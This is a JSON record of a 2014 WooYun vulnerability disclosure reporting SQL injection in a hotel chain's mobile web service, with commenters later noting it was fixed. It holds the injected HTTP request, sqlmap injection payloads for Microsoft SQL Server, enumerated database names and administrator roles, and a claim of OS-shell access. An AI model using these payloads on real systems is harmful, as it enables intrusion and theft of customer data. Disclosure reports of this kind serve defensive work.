{"id": 5810, "wybug_id": "wooyun-2014-050857", "wybug_title": "速8酒店SQL注入(可获得os-shell)", "wybug_corp": "速8酒店", "wybug_author": "m_vptr", "wybug_date": "2014-02-13 16:33", "wybug_open_date": "2014-02-23 16:33", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： sql注入 详细说明：  http://www0.super8.com.cn/mobileInterface/Super8Interface.asmx?op=getCustInfo存在sql注入\nPOST /mobileInterface/Super8Interface.asmx/getCustInfo HTTP/1.1Host: www0.super8.com.cnProxy-Connection: keep-aliveContent-Length: 19Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www0.super8.com.cnUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.77 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://www0.super8.com.cn/mobileInterface/Super8Interface.asmx?op=getCustInfoAccept-Encoding: gzip,deflate,sdchAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4Cookie: _ga=GA1.3.576428575.1392259674; __ozlvd1031=1392266610; Hm_lvt_f9811dfd07fecd5f46d92b0f29d344e7=1392259675; Hm_lpvt_f9811dfd07fecd5f46d92b0f29d344e7=1392266611; arp_scroll_position=634cardNo=300976300%27\nSQL注入\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: cardNo    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cardNo=300976300' AND 1257=1257-- ODsg    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: cardNo=300976300' AND 3358=CONVERT(INT,(SELECT CHAR(113)+CHAR(102)+CHAR(107)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (3358=3358) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(117)+CHAR(102)+CHAR(99)+CHAR(113)))-- tqxg    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: cardNo=300976300'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: cardNo=300976300' WAITFOR DELAY '0:0:5'-----[16:09:35] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008\n可获得os-shell\n\n浏览了一下\n\n和  WooYun: 速8酒店某处泄漏大量用户资料及订单信息  是同一个页面。   漏洞证明：  dbs\navailable databases [16]:[*] bidata[*] crs_report[*] distribution[*] importcard20130412[*] ipegasus3[*] ipegasus_history[*] ipegasus_mirro[*] ipegasus_report[*] iPegasusWeb[*] master[*] model[*] msdb[*] tempcard[*] tempcard2[*] tempcard3[*] tempdb\nroles\ndatabase management system users roles:[*] ##MS_PolicyEventProcessingLogin##[*] ##MS_PolicyTsqlExecutionLogin##[*] bi (administrator)[*] crs[*] crs2[*] distributor_admin (administrator)[*] pms[*] sa (administrator)[*] super8admin (administrator)[*] super8web (administrator)[*] super8webadmin (administrator)\nos-shell\n\n浏览\n\n不知道干啥的\n\n没拖库，下文件，cookie都贴出来了，天地良心。   修复方案：  检查   版权声明：转载请注明来源 m_vptr@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-02-23 16:33 厂商回复：  漏洞Rank：12  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-24 12:42 |    \t\tm_vptr \t\t\t( 普通白帽子  |\t\t\t        Rank:133 漏洞数:30        | 新手)\t\t \n  这是过了10天处理周期自动被忽略了吗?    \n     2014-02-24 17:03 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @m_vptr @速8酒店 漏洞修复没？    \n     2014-02-24 20:05 |    \t\tm_vptr \t\t\t( 普通白帽子  |\t\t\t        Rank:133 漏洞数:30        | 新手)\t\t \n  @疯狗 还没...    \n     2014-02-25 16:46 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  忽略了，不蛤蛤    \n     2014-03-11 20:23 |    \t\tm_vptr \t\t\t( 普通白帽子  |\t\t\t        Rank:133 漏洞数:30        | 新手)\t\t \n  @疯狗 重测了一遍，漏洞已经修复了    \n     2014-03-11 23:16 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @m_vptr 修了就好，就是反应满半拍呢？    \n     2014-04-27 23:43 |    \t\tm_vptr \t\t\t( 普通白帽子  |\t\t\t        Rank:133 漏洞数:30        | 新手)\t\t \n  @疯狗 Rank差点就100了，这个能补个分嘛?    \n     2014-04-28 12:13 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @m_vptr 补了 还愿吧哈哈    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}